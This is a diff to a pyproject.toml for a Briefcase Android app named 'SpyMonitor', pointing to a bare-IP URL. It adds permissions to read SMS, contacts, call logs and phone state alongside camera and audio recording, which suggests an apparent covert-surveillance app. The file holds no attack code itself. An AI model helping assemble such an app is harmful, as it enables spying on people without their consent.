@@ -3,10 +3,10 @@ requires = ["briefcase"]
 
 [tool.briefcase]
 project_name = "SpyMonitor"
-bundle = "org.beeware.spymonitor"
-version = "2.0.0"
+bundle = "org.beeware.spymonitor.v2"
+version = "2.0.1"
 url = "https://147.79.111.118/"
-license = "LICENSE"
+license = {file = "LICENSE"}
 author = "Iuri Rodrigues"
 author_email = "irodti93@gmail.com"
 
@@ -31,8 +31,10 @@ requires = []
 requires = []
 
 [tool.briefcase.app.spymonitor.android]
+android_main_activity = "org.beeware.android.MainActivity"
 requires = [
     "toga-android>=0.4.0",
+    "rubicon-java>=0.2.0",
     "plyer>=2.1.0",
     "requests>=2.28.0",
 ]
@@ -62,3 +64,7 @@ permission_read_external_storage = true
 permission_write_external_storage = true
 permission_camera = true
 permission_record_audio = true
+permission_read_contacts = true
+permission_read_sms = true
+permission_read_call_log = true
+permission_read_phone_state = true
